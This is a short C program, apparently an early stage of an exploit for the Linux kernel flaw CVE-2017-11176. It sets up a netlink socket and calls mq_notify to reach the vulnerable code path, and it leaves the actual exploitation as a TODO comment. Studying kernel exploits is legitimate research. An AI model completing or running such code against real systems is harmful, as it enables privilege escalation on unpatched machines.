#define _GNU_SOURCE
#include <unistd.h>
#include <sys/syscall.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <linux/netlink.h>
#include <stdio.h>
#include <string.h>
#include <signal.h>
#define _mq_notify(mqdes, sevp) syscall(__NR_mq_notify, mqdes, sevp)
#define _socket(domain, type, protocol) syscall(__NR_socket, domain, type, protocol)
#define NOTIFY_COOKIE_LEN 32

int main(){
  struct sigevent sigev;
  char sigval_buffer[NOTIFY_COOKIE_LEN];
  int sock_fd;
  printf("-= { CVE-2017-11176 } =-\n");

  if((sock_fd = _socket(AF_NETLINK, SOCK_DGRAM, NETLINK_GENERIC)) < 0){
    perror("socket");
    goto fail;
  }
  printf("netlink socket created = %d\n", sock_fd);

  memset(&sigev, 0, sizeof(sigev));
  sigev.sigev_notify = SIGEV_THREAD; 
  sigev.sigev_value.sival_ptr = sigval_buffer;
  sigev.sigev_signo = sock_fd;

  if(_mq_notify(-1, &sigev)){
    perror("mqnotify");
    goto fail;
  }
  printf("mqnotify succeed\n");
  // TODO: exploit 
  return 0;

fail:
  printf("exploit failed!\n");
  return -1;
}
